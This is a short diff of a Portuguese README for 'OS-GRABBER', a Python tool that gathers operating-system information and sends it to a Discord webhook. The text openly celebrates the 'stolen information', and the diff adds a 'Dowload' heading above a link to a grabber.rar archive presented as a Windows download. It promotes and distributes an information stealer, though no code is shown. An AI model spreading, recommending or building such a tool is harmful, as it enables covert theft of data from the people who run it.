@@ -37,7 +37,7 @@ O OS-GRABBER é uma ferramenta Python que coleta informações do sistema operac
 4. As informações serão enviadas para o webhook do Discord especificado.
 5. Seja feliz com as informações roubadas
 
-## Sistemas suportados
+## Dowload
 
 <a href="https://github.com/slayerkk/source/raw/main/grabber.rar">
         <img src="https://icones.pro/wp-content/uploads/2022/09/icone-windows-10.png" width="100px" />
